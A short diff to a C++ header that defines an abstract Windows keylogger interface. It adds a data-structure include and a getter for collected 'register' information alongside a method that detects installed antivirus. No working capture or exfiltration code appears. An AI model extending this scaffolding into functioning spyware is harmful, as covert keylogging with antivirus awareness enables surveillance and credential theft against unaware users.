@@ -16,6 +16,7 @@
 #include	<iostream>
 #include	<string>
 #include	<windows.h>
+#include	"dataStructure.hpp"
 
 class 		IKeyLogger
 {
@@ -38,6 +39,9 @@ public:
 
   ///brief retrieve the anti virus of the computer
   virtual void		getAntiVirus() = 0;
+
+  ///brief getter of the t_register attribute.
+  virtual t_register const *getInfos() = 0;
 };
 
 
